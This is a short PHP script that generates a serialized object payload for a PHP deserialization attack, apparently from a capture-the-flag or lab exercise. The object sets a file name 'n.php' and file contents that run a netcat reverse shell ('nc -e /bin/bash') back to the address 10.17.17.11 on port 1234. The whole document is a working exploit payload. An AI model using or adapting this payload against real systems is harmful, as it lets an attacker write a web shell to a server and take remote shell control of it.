<?php
class file
{
 public $file = 'n.php';
 public $data = '<?php shell_exec("nc -e /bin/bash 10.17.17.11 1234"); ?>';
}
echo (serialize(new file));
?>
